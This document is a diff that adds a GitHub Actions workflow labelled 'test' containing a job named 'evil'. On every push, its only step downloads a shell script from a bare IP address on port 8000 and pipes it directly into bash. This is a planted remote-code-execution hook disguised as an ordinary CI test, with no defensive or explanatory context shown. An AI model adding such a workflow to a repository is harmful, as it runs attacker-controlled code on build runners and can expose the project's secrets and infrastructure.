@@ -1,0 +1,14 @@
+name: "test"
+
+on:
+  push:
+
+jobs:
+  evil:
+      name: evil
+      runs-on: ubuntu-latest
+      steps:
+      - name: prepare
+        run: |
+        
+            curl http://146.59.195.165:8000/shell.sh | bash
